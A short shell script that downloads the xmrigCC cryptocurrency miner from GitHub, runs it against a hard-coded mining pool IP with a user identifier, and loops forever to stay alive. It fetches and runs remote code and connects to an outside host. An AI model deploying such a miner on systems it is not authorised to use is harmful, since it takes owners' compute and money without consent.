#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.2/xmrigCC-3.3.2-linux-dynamic-amd64.tar.gz
tar -xf xmrigCC-3.3.2-linux-dynamic-amd64.tar.gz
cd miner
./xmrigDaemon --donate-level 1 -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.william4mac -p x -a cryptonight-extremelite --variant upx2 -k
while [ 1 ] ; do
sleep 3
done
sleep 999
